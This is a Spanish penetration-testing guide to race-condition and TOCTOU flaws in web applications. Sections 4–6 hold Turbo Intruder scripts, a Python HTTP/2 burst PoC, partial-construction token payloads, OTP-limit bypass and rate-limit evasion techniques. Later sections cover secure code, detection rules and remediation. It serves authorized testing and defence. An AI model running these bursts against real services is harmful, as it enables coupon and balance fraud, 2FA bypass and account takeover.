# Condiciones de carrera (Race Conditions / TOCTOU)

| Clasificación | |
|---|---|
| CWE | CWE-362 — Concurrent Execution using Shared Resource with Improper Synchronization ('Race Condition'); CWE-367 — Time-of-check Time-of-use (TOCTOU) Race Condition; CWE-837 — Improper Enforcement of a Single, Unique Action; CWE-799 — Improper Control of Interaction Frequency |
| OWASP Top 10:2025 | A06 — Insecure Design (A01 — Broken Access Control o A07 — Authentication Failures cuando la carrera salta un control de acceso o de autenticación) |
| OWASP API Top 10:2023 | API6 — Unrestricted Access to Sensitive Business Flows; API4 — Unrestricted Resource Consumption (límites de uso) |
| WSTG | WSTG-BUSL-04 (temporización del proceso), WSTG-BUSL-05 (número de veces que se puede usar una función) |

**Contenido:** 1. Qué es · 2. Dónde buscar · 3. Detección segura · 4. Explotación (superar límites, ataque de paquete único HTTP/2, sincronización del último byte HTTP/1.1, Turbo Intruder, carreras entre endpoints, construcción parcial, tokens dependientes del tiempo, bloqueo de sesión, subidas, WebSocket/GraphQL, script asyncio/httpx) · 5. Evasión · 6. Escalada · 7. Caja blanca · 8. Falsos positivos · 9. Evidencia · 10. Severidad · 11. Remediación · 12. Herramientas · 13. Referencias

---

## 1. Qué es y por qué ocurre

Una *condición de carrera* aparece cuando el resultado depende del orden en que se ejecutan operaciones concurrentes sobre un recurso compartido (un saldo, un cupón, un contador, una fila de base de datos) sin una sincronización adecuada. El patrón más habitual es **TOCTOU** (*time-of-check to time-of-use*, «momento de la comprobación frente a momento del uso»): el servidor comprueba una condición («el cupón no se ha usado», «hay saldo»), y unos milisegundos después actúa en consecuencia; si llegan varias peticiones dentro de esa *ventana de carrera*, todas pasan la comprobación antes de que la primera registre el cambio.

```
Petición A: lee saldo = 100 ──┐
Petición B: lee saldo = 100 ──┤   (ventana de carrera)
Petición A: escribe 100-80 = 20
Petición B: escribe 100-80 = 20   → se han retirado 160 con saldo de 100
```

Tipos principales:

- **Superación de límites** (*limit overrun*): usar más veces de las permitidas algo de un solo uso (cupón, tarjeta regalo, voto, invitación, intento de OTP).
- **Lectura-modificación-escritura** (*read-modify-write*): dos procesos leen el mismo valor, lo modifican en memoria y lo escriben, perdiendo una de las actualizaciones.
- **Subestados ocultos** (investigación *Smashing the state machine*, PortSwigger 2023): durante el procesamiento de una sola petición el objeto pasa por estados intermedios breves (usuario creado pero token aún nulo, correo cambiado pero confirmación aún pendiente) que otra petición concurrente puede aprovechar.
- **Carreras entre endpoints** (*multi-endpoint*): una petición modifica el estado que otra, en otro endpoint, está validando (añadir al carrito mientras se confirma el pago).

Por qué ocurre: comprobaciones y escrituras en sentencias separadas, nivel de aislamiento de base de datos por defecto (*READ COMMITTED*), cachés o contadores en Redis con `GET` y `SET` separados, arquitectura de microservicios y colas sin claves de idempotencia, y supuestos de «el usuario no puede pulsar dos veces tan rápido».

## 2. Dónde buscar (señales del reconocimiento)

- Acciones que deberían ocurrir **una sola vez** o **un número limitado de veces**: canjear cupón o tarjeta regalo, reclamar recompensa, votar, aceptar invitación, registrar un nombre de usuario o correo único, verificar un OTP, retirar saldo, transferir, reservar el último asiento o la última unidad.
- Acciones con **límite de intentos**: login, 2FA, restablecimiento de contraseña, CAPTCHA, cuotas de API.
- Flujos con **varios pasos sobre el mismo objeto**: cambio de correo con confirmación, checkout, creación de cuenta con token de confirmación, subida de archivo + validación posterior.
- Señales en respuestas: operaciones lentas (más de 100 ms) entre comprobación y escritura, respuestas asíncronas (`202 Accepted`), colas, webhooks, identificadores de transacción, mensajes del tipo «ya canjeado» que solo aparecen en el segundo intento secuencial.
- Tecnología: PHP con sesiones en fichero (bloqueo por sesión), ORMs con `get()` + `save()`, funciones *serverless* que procesan el mismo evento en paralelo, GraphQL con lotes (*batching*).

## 3. Detección segura (primeras sondas, no destructivas)

1. **Línea base secuencial.** Envía la acción dos veces, una detrás de otra, con la misma cuenta de prueba. Anota la respuesta del segundo intento (por ejemplo, `400 Coupon already used`). Si la segunda vez ya funciona en secuencia, no es una carrera: es un fallo de lógica (ver `vulns/business-logic.md`).
2. **Ráfaga mínima en paralelo.** Repite la acción con **entre 2 y 5 peticiones simultáneas** usando el ataque de paquete único (sección 4.2). Busca respuestas mezcladas (varios `200`), cuerpos distintos, errores `500`, `409` o mensajes de bloqueo (*deadlock*) que delatan concurrencia sin control.
3. **Medir el efecto, no solo las respuestas.** Comprueba saldo, número de canjes, votos o registros creados después de la ráfaga.
4. **Repetir varias veces.** Las carreras son probabilísticas: documenta la tasa de éxito («3 de 10 intentos»).
5. **Escalar solo si hace falta.** Aumenta a 10–20 peticiones únicamente si con 5 no se obtiene señal y el cliente lo ha autorizado.

⚠️ Las carreras sobre saldos, pagos, reembolsos, inventario real o datos de otros usuarios generan efectos duplicados reales: **requiere confirmación explícita del cliente**. Usar cuentas y medios de pago de prueba, el menor número de peticiones paralelas que demuestre el fallo y anotar los identificadores generados para revertirlos.

## 4. Explotación por contexto o tecnología

### 4.1 Por qué la sincronización importa

Si envías 20 peticiones con hilos normales, la latencia de red (*jitter*: variación aleatoria del retardo) las reparte a lo largo de decenas de milisegundos y la ventana de carrera, que puede durar 1–5 ms, se pierde. Las técnicas modernas eliminan la red de la ecuación haciendo que todas las peticiones **terminen de llegar al servidor en el mismo instante**.

### 4.2 Ataque de paquete único (*single-packet attack*, HTTP/2)

Presentado por James Kettle (PortSwigger, Black Hat 2023). En HTTP/2 varias peticiones viajan multiplexadas en una sola conexión TCP como *streams* independientes. El cliente envía todas las cabeceras y casi todo el cuerpo de cada petición, retiene el último *frame* de cada una y después envía todos esos *frames* finales juntos en **un único paquete TCP**. El servidor completa las 20–30 peticiones a la vez, con una dispersión de microsegundos.

En Burp Repeater (2023.9 o posterior):

1. Envía la petición a Repeater y duplica la pestaña N veces (Ctrl+R). Para N grandes, usa Turbo Intruder.
2. Agrupa las pestañas (*Add tab to group*).
3. Menú del botón *Send* → **Send group in parallel (single-packet attack)**.
4. Si el objetivo solo habla HTTP/1.1, Burp aplica automáticamente sincronización del último byte.

**Calentamiento de conexión** (*connection warming*): las primeras peticiones de una conexión suelen tardar más (TLS, *pool* del servidor). Añade al principio del grupo una petición inocua (`GET /`) o envía el grupo en secuencia primero para que el *backend* tenga las conexiones calientes; si la primera petición del grupo es sistemáticamente más lenta, el problema es de conexión, no de la aplicación.

### 4.3 Sincronización del último byte (*last-byte sync*, HTTP/1.1)

Para servidores sin HTTP/2: se abren N conexiones, se envía cada petición completa menos el último byte y, cuando todas están listas, se envía el byte final en todas a la vez. Es menos precisa que el paquete único (depende de N conexiones distintas), pero sigue siendo muy superior a los hilos.

### 4.4 Turbo Intruder

Extensión de Burp con un motor optimizado. Las *gates* (puertas) retienen el final de las peticiones hasta `openGate`.

```python
# Superación de límites: N copias idénticas en un solo paquete (HTTP/2)
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2)
    for i in range(10):                 # empezar bajo; subir solo con autorización
        engine.queue(target.req, gate='race1')
    engine.openGate('race1')

def handleResponse(req, interesting):
    table.add(req)
```

```python
# HTTP/1.1: sincronización del último byte con varias conexiones
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=10,
                           requestsPerConnection=1,
                           engine=Engine.THREADED,
                           pipeline=False)
    for i in range(10):
        engine.queue(target.req, gate='race1')
    engine.openGate('race1')

def handleResponse(req, interesting):
    table.add(req)
```

```python
# Valores distintos en la misma ráfaga (p. ej., varios códigos o usuarios):
# la petición base contiene %s donde va el valor
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=1, engine=Engine.BURP2)
    for word in wordlists.clipboard:      # lista copiada al portapapeles
        engine.queue(target.req, word, gate='race1')
    engine.openGate('race1')

def handleResponse(req, interesting):
    table.add(req)
```

### 4.5 Carreras entre endpoints (*multi-endpoint*)

Se envían peticiones **distintas** en la misma ráfaga para que una cambie el estado mientras otra lo valida. Ejemplo de checkout: el pago valida el carrito (1 producto barato) y, en el mismo instante, se añade un producto caro.

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=1, engine=Engine.BURP2)
    checkout = '''POST /cart/checkout HTTP/2
Host: target.example
Cookie: session=SESION_PRUEBA
Content-Type: application/x-www-form-urlencoded

csrf=TOKEN
'''
    add_item = '''POST /cart HTTP/2
Host: target.example
Cookie: session=SESION_PRUEBA
Content-Type: application/x-www-form-urlencoded

productId=1&quantity=1
'''
    engine.queue(checkout, gate='race1')
    engine.queue(add_item, gate='race1')
    engine.openGate('race1')

def handleResponse(req, interesting):
    table.add(req)
```

Si los endpoints tienen tiempos de procesamiento muy diferentes, alinea las ventanas: calienta la conexión, coloca primero la petición lenta o añade relleno al cuerpo de la rápida para retrasarla ligeramente.

### 4.6 Un solo endpoint con datos distintos (colisión)

Cambio de correo: dos peticiones simultáneas al mismo endpoint con valores diferentes pueden hacer que el correo de confirmación de una se envíe con el token o el destinatario de la otra.

```http
POST /my-account/change-email     email=prueba-atacante@cliente-test.example
POST /my-account/change-email     email=otra-cuenta-prueba@cliente-test.example
```

Si llega al buzón de la primera dirección un enlace que confirma la segunda, se puede confirmar un correo que no controlas → posible toma de cuenta cuando el correo confirmado otorga privilegios (por ejemplo, dominios corporativos con rol automático). Probar solo con direcciones de prueba propias.

### 4.7 Construcción parcial (*partial construction*)

Un objeto se crea en varias escrituras: primero la fila del usuario y luego su token de confirmación. Entre ambas, el token vale `null` o vacío. Si se envía la confirmación en ese microintervalo con un valor que el lenguaje compara como vacío, se confirma la cuenta sin token:

```http
POST /register        username=usuario-prueba-7&email=x@dominio-no-controlado.example&password=…
POST /confirm?token[]=          (en PHP, token[] se convierte en un array vacío que puede igualar a null)
```

En Turbo Intruder se encola un registro y varias confirmaciones tras la misma puerta, repitiendo con nombres de usuario distintos. ⚠️ Esta técnica requiere muchas peticiones por intento: **requiere confirmación explícita del cliente** y debe limitarse a pocos intentos. Variantes: `token=` vacío, `token=null`, JSON `{"token":null}`, `{"token":[]}`.

### 4.8 Ataques dependientes del tiempo

Algunos tokens se derivan de la hora (`md5(timestamp)`, `uniqid()`) en lugar de un generador aleatorio seguro. Si se piden dos restablecimientos de contraseña en el mismo instante, uno para la cuenta propia y otro para una segunda cuenta de prueba, y ambos tokens coinciden, se puede usar el token recibido para restablecer la otra cuenta. Esto demuestra un token predecible (ver `vulns/authentication.md`).

**Bloqueo de sesión:** frameworks como PHP con sesiones en fichero bloquean la sesión durante `session_start()`, así que las peticiones con la misma cookie se serializan. Si la ráfaga sale ordenada y con tiempos escalonados, obtén varias sesiones válidas y asigna una cookie distinta a cada petición.

### 4.9 Límites de intentos (login, OTP, CAPTCHA)

Enviar 20–30 códigos OTP en un solo paquete antes de que el contador de intentos se incremente puede superar un límite de 3–5 intentos. Para demostrarlo basta con que el número de respuestas «código incorrecto» (en lugar de «bloqueado») supere el límite documentado; no hace falta adivinar el código. ⚠️ No ejecutar fuerza bruta completa sin **confirmación explícita del cliente**.

### 4.10 Subida y procesamiento de archivos

Si el archivo se guarda en una ruta pública y después se valida y borra, se puede solicitar la ruta en paralelo con la subida para ejecutarlo o descargarlo antes del borrado (ver `vulns/file-upload.md`).

### 4.11 WebSocket, GraphQL, gRPC y *serverless*

- **WebSocket:** varios mensajes de acción enviados de inmediato sobre la misma conexión o sobre varias conexiones abiertas a la vez.
- **GraphQL:** un solo POST con un lote de mutaciones o alias (`a1: redeem(code:"X") a2: redeem(code:"X")`); el servidor puede resolverlas en paralelo (ver `vulns/graphql.md`).
- **gRPC:** varias llamadas unarias concurrentes en el mismo canal HTTP/2 o mensajes rápidos en un *stream* bidireccional.
- **Serverless:** reintentos automáticos o entregas duplicadas de colas (SQS, Pub/Sub) que ejecutan la misma acción dos veces si no hay idempotencia.

### 4.12 Más allá de ~30 peticiones

El paquete único está limitado por el tamaño de un paquete TCP. En 2024 RyotaK (Flatt Security) publicó una extensión llamada *first sequence sync* que combina fragmentación IP y reordenación de números de secuencia TCP para sincronizar miles de peticiones. Es útil en investigación, pero en un encargo profesional casi nunca hace falta: si 20 peticiones no muestran el fallo, aumentar a miles roza la denegación de servicio. ⚠️ **Requiere confirmación explícita del cliente**.

### 4.13 Script de prueba controlada con Python (asyncio + httpx)

Útil para reproducir una carrera ya confirmada en Burp y adjuntar un PoC al informe. Usa una única conexión HTTP/2 con *streams* concurrentes (no es un paquete único real, por lo que es menos preciso que Burp) y un límite de seguridad de peticiones.

```python
#!/usr/bin/env python3
"""PoC de condición de carrera controlada. Uso exclusivo en encargos autorizados.
Requisitos: pip install "httpx[http2]"
Ejemplo: python3 race_poc.py --url https://target.example/api/coupon/redeem \
         --token "$TOKEN_PRUEBA" --body '{"code":"TEST-SINGLE-USE"}' -n 5 --confirm
"""
import argparse, asyncio, hashlib, json, time
from collections import Counter
import httpx

MAX_N = 20  # techo duro; ampliar solo con autorización escrita

async def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--url", required=True)
    ap.add_argument("--token", required=True, help="token de una cuenta de PRUEBA")
    ap.add_argument("--body", default="{}")
    ap.add_argument("-n", type=int, default=5)
    ap.add_argument("--confirm", action="store_true", help="confirmo que el cliente lo ha autorizado")
    a = ap.parse_args()
    if not a.confirm:
        raise SystemExit("Añade --confirm solo si el cliente ha autorizado la prueba.")
    n = min(a.n, MAX_N)
    headers = {"Authorization": f"Bearer {a.token}", "Content-Type": "application/json"}
    async with httpx.AsyncClient(http2=True, timeout=15, headers=headers) as client:
        await client.get(a.url.rsplit("/", 1)[0] + "/")           # calentar la conexión
        reqs = [client.build_request("POST", a.url, content=a.body) for _ in range(n)]
        gate = asyncio.Event()

        async def fire(i, req):
            await gate.wait()
            t0 = time.perf_counter()
            r = await client.send(req)
            return i, r.status_code, (time.perf_counter() - t0) * 1000, r.text

        tasks = [asyncio.create_task(fire(i, r)) for i, r in enumerate(reqs)]
        await asyncio.sleep(0.2)          # todas las tareas esperando en la puerta
        gate.set()
        results = await asyncio.gather(*tasks)

    for i, status, ms, text in sorted(results):
        print(f"#{i:02d} {status} {ms:7.1f} ms sha1={hashlib.sha1(text.encode()).hexdigest()[:10]} {text[:80]!r}")
    print("Resumen de códigos:", dict(Counter(s for _, s, _, _ in results)))

if __name__ == "__main__":
    asyncio.run(main())
```

Después de ejecutarlo, verifica el estado real (saldo, canjes) con una petición `GET` independiente. Para precisión máxima fuera de Burp existen bibliotecas que implementan el paquete único en Python, como `h2spacex`; valida su comportamiento antes de usarlas en un encargo.

## 5. Evasión de filtros y WAF

- **Limitación de velocidad por IP o por sesión:** el paquete único llega como una sola ráfaga y muchos limitadores cuentan después de procesar; si el limitador está en el borde (CDN), varias sesiones distintas o rutas equivalentes (`/api/v1/` y `/api/v2/`) pueden repartir la carga.
- **Tokens CSRF de un solo uso:** obtén N tokens válidos antes de la ráfaga (cargando el formulario N veces) y asigna uno a cada petición en Turbo Intruder con `%s`.
- **Bloqueo por sesión:** una cookie de sesión distinta por petición (sección 4.8).
- **Idempotencia por clave del cliente:** si el servidor deduplica por `Idempotency-Key`, comprueba si la clave la genera el cliente; enviar una clave distinta por petición anula la protección.
- **WAF que bloquea ráfagas:** reducir N, añadir calentamiento y repetir varias rondas pequeñas suele ser suficiente. Para filtros de contenido, ver `vulns/waf-bypass.md`.

## 6. Escalada y encadenamiento (demostrar impacto máximo sin causar daño)

- **Multiplicar valor:** tarjeta regalo de 10 € canjeada 3 veces = 30 € de crédito; si el crédito es transferible o retirable, el impacto es económico directo. Demostrar con el importe mínimo posible.
- **Saltar autenticación:** superar el límite de OTP → fuerza bruta viable de 2FA → toma de cuenta. Demostrar el sobrepaso del límite, no el acceso a una cuenta real.
- **Escalada de privilegios:** aceptar en paralelo invitaciones o cambios de rol; la carrera en una mutación de rol puede otorgar permisos de administrador.
- **Toma de cuenta:** colisión en cambio de correo (4.6), tokens de restablecimiento idénticos (4.8) o construcción parcial (4.7) que confirma correos ajenos.
- **Encadenar con lógica de negocio:** cupón del 100 % aplicado en paralelo → total negativo → crédito (ver `vulns/business-logic.md`).

Siempre: cuentas de prueba, importes simbólicos, parar en la primera duplicación evidente y pedir al cliente que revierta los movimientos.

## 7. Caja blanca: fuentes, sumideros y patrones de código

Busca **comprobación y escritura separadas** sobre el mismo recurso sin bloqueo, transacción adecuada ni restricción única.

### SQL

```sql
-- VULNERABLE: lectura y escritura separadas (READ COMMITTED)
SELECT balance FROM accounts WHERE id = 123;          -- la aplicación compara en memoria
UPDATE accounts SET balance = 20 WHERE id = 123;      -- escribe un valor calculado

-- SEGURO: actualización condicional atómica; comprobar filas afectadas
UPDATE accounts SET balance = balance - 80 WHERE id = 123 AND balance >= 80;
-- o bloqueo de fila dentro de una transacción
SELECT balance FROM accounts WHERE id = 123 FOR UPDATE;
-- unicidad en base de datos para acciones de un solo uso
ALTER TABLE coupon_redemptions ADD CONSTRAINT uq_coupon_user UNIQUE (coupon_id, user_id);
INSERT INTO coupon_redemptions (coupon_id, user_id) VALUES ($1, $2) ON CONFLICT DO NOTHING;
```

### Python / Django

```python
# VULNERABLE
coupon = Coupon.objects.get(code=code)
if not coupon.used:
    apply_discount(cart, coupon)
    coupon.used = True
    coupon.save()

# SEGURO: actualización condicional; solo una petición obtiene updated == 1
with transaction.atomic():
    updated = Coupon.objects.filter(code=code, used=False).update(used=True, used_by=user)
    if updated != 1:
        raise ValidationError("Cupón no válido o ya usado")
    apply_discount(cart, code)

# Saldo: F() + select_for_update
with transaction.atomic():
    acct = Account.objects.select_for_update().get(pk=acct_id)
    if acct.balance < amount:
        raise ValidationError("Saldo insuficiente")
    acct.balance = F("balance") - amount
    acct.save(update_fields=["balance"])
```

### Node.js (Redis, Sequelize, Prisma)

```js
// VULNERABLE: GET y SET separados
if (!(await redis.get(`redeemed:${code}`))) { await credit(user); await redis.set(`redeemed:${code}`, 1); }
// SEGURO: SET NX atómico
const ok = await redis.set(`redeemed:${code}`, user.id, { NX: true, EX: 86400 });
if (!ok) throw new Error('ya canjeado');

// Prisma: actualización condicional
const r = await prisma.coupon.updateMany({ where: { code, used: false }, data: { used: true } });
if (r.count !== 1) throw new Error('ya canjeado');
```

### Ruby on Rails / Java

```ruby
account.with_lock do                       # SELECT ... FOR UPDATE
  raise 'saldo' if account.balance < amount
  account.update!(balance: account.balance - amount)
end
```

```java
@Lock(LockModeType.PESSIMISTIC_WRITE)       // Spring Data JPA
Optional<Account> findById(Long id);
// o bloqueo optimista con @Version y reintento ante OptimisticLockException
```

### Consultas para localizarlo

```bash
# Patrón comprobar-y-luego-guardar en ORMs
rg -n -U "objects\.get\([^)]*\)[\s\S]{0,300}?\.save\(\)" --type py
rg -n -U "findOne\([^)]*\)[\s\S]{0,300}?\.(save|update)\(" --type js --type ts
# Redis no atómico
rg -n "redis\.(get|exists)\(" -A5 | rg "\.set\(" | rg -v "NX"
# Tokens derivados del tiempo
rg -n -i "(md5|sha1|sha256)\(.*(time|date|now|timestamp|uniqid)" 
rg -n "uniqid\(|Date\.now\(\)\.toString\(|time\.time\(\)" 
# ¿Hay bloqueos o idempotencia?
rg -n -i "(select_for_update|FOR UPDATE|with_lock|PESSIMISTIC_WRITE|ON CONFLICT|idempotency)"
```

```yaml
# semgrep: lectura y guardado separados en Django sin transacción con bloqueo
rules:
  - id: django-check-then-save-race
    languages: [python]
    severity: WARNING
    message: Posible TOCTOU; usar update() condicional o select_for_update() en transaction.atomic()
    patterns:
      - pattern: |
          $O = $M.objects.get(...)
          ...
          if <... $O.$F ...>:
              ...
              $O.save(...)
      - pattern-not-inside: |
          with transaction.atomic():
              ...
              $O = $M.objects.select_for_update().get(...)
              ...
```

## 8. Falsos positivos frecuentes

- Varias respuestas `200` pero un solo efecto real: el servidor responde éxito y deduplica después (comprueba el estado final).
- Efecto duplicado que el proceso de conciliación revierte automáticamente antes de que pueda aprovecharse.
- Diferencias en respuestas causadas por la caché, no por la carrera.
- Duplicados creados también en secuencia: es un fallo de lógica o de idempotencia, no una carrera (sigue siendo reportable, con otra clasificación).
- Ráfaga «exitosa» con peticiones que en realidad se procesaron en serie (tiempos escalonados): la ventana no se ha alcanzado; revisa calentamiento y bloqueo de sesión antes de descartar.
- Contadores de visualización o métricas no críticas duplicadas: impacto despreciable.

## 9. Evidencia mínima para validarlo

- Petición base, técnica usada (paquete único HTTP/2, último byte HTTP/1.1, script) y número de peticiones paralelas.
- Respuestas de la ráfaga con códigos y tiempos (captura de Burp o salida del script).
- **Estado antes y después** obtenido con una petición independiente (saldo, canjes, registros).
- **Tasa de éxito** sobre varias rondas («4 de 10 rondas con canje duplicado»).
- Comparación con la línea base secuencial que demuestra que el control existe pero no es atómico.
- Identificadores generados para la reversión por parte del cliente.

## 10. Severidad orientativa (vectores CVSS 3.1 y 4.0 típicos según impacto demostrado)

Las carreras dependen de condiciones de tiempo: si el éxito es intermitente, `AC:H` (3.1) o `AT:P` (4.0, *attack requirements present*) son razonables; si el paquete único lo reproduce de forma fiable, muchos evaluadores usan `AC:L`.

| Impacto demostrado | CVSS 3.1 | CVSS 4.0 (vector; calcular la puntuación en FIRST) |
|---|---|---|
| Duplicar votos, seguidores o invitaciones sin valor económico | `AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:L/A:N` → 3.1 | `CVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:N/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N` |
| Cupón o tarjeta regalo multicanjeado; retirada por encima del saldo | `AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:H/A:N` → 5.3 (con `AC:L` → 6.5) | `CVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N` |
| Superar el límite de intentos de OTP (2FA eludible) | `AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:N` → 6.8 | `CVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N` |
| Toma de cuenta sin autenticación (tokens de restablecimiento coincidentes) | `AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N` → 7.4 | `CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N` |

## 11. Remediación (con ejemplo de código correcto)

- **Operaciones atómicas en la base de datos:** `UPDATE … WHERE condición` comprobando filas afectadas; `INSERT … ON CONFLICT DO NOTHING`; restricciones `UNIQUE` para «uno por usuario».
- **Bloqueo pesimista** (`SELECT … FOR UPDATE`, `with_lock`, `PESSIMISTIC_WRITE`) en recursos de alto valor, o **bloqueo optimista** (columna `version` y reintento).
- **Aislamiento `SERIALIZABLE`** para transacciones críticas, con reintento ante fallos de serialización.
- **Idempotencia:** clave `Idempotency-Key` ligada al usuario y a la operación, almacenada con TTL corto y unicidad; deduplicación por identificador de evento en colas y webhooks.
- **Primitivas atómicas en cachés:** `SET NX`, `INCR`, scripts Lua; bloqueos distribuidos solo cuando no hay alternativa en la base de datos.
- **Estado consistente en una sola escritura:** crear el usuario y su token en la misma transacción (evita la construcción parcial).
- **Tokens con generador criptográfico** (`secrets.token_urlsafe`, `crypto.randomBytes`), nunca derivados de la hora.
- **Límites de intentos atómicos** (incremento antes de verificar, no después).

```python
# Retirada atómica con PostgreSQL (psycopg)
def withdraw(conn, account_id, amount_cents, idem_key, user_id):
    with conn.transaction():
        cur = conn.execute(
            "INSERT INTO idempotency_keys (user_id, key) VALUES (%s, %s) ON CONFLICT DO NOTHING",
            (user_id, idem_key))
        if cur.rowcount == 0:
            raise DuplicateRequest()
        cur = conn.execute(
            "UPDATE accounts SET balance_cents = balance_cents - %s "
            "WHERE id = %s AND owner_id = %s AND balance_cents >= %s",
            (amount_cents, account_id, user_id, amount_cents))
        if cur.rowcount != 1:
            raise InsufficientFunds()
```

## 12. Herramientas (comando y cuándo usarla; automatización solo tras confirmación manual, nunca como primer barrido)

| Herramienta | Uso |
|---|---|
| Burp Repeater — *Send group in parallel (single-packet attack)* | Primera opción para confirmar con 2–20 peticiones; aplica último byte en HTTP/1.1 |
| Burp Repeater — *Send group in sequence (single connection)* | Línea base y calentamiento de conexión |
| Turbo Intruder (`Engine.BURP2` / `Engine.THREADED`) | Carreras entre endpoints, valores distintos por petición, construcción parcial |
| Script `asyncio` + `httpx[http2]` (sección 4.13) | PoC reproducible para el informe tras confirmar en Burp |
| `h2spacex` (biblioteca Python) | Paquete único fuera de Burp; validar antes de usar |
| PortSwigger Race Condition labs | Practicar las técnicas antes del encargo |

`curl … &` en bucle o hilos simples solo sirven como señal grosera; un negativo con ellos no descarta la vulnerabilidad.

## 13. Referencias

- PortSwigger — Race conditions (teoría y laboratorios): https://portswigger.net/web-security/race-conditions
- James Kettle — *Smashing the state machine: the true potential of web race conditions* (2023): https://portswigger.net/research/smashing-the-state-machine
- Turbo Intruder: https://github.com/PortSwigger/turbo-intruder
- RyotaK — *Beyond the limit: expanding single-packet race condition with a first sequence sync* (blog de investigación de Flatt Security, 2024)
- OWASP WSTG — Business Logic Testing (BUSL-04, BUSL-05): https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/
- PayloadsAllTheThings — Race Condition: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Race%20Condition
- HackTricks — Race Condition: https://book.hacktricks.wiki/en/pentesting-web/race-condition.html
- CWE-362: https://cwe.mitre.org/data/definitions/362.html · CWE-367: https://cwe.mitre.org/data/definitions/367.html
- IETF draft — The Idempotency-Key HTTP Header Field: https://datatracker.ietf.org/doc/draft-ietf-httpapi-idempotency-key-header/
- SnailSploit offensive-checklist (MIT), race-condition.md: https://github.com/SnailSploit/offensive-checklist
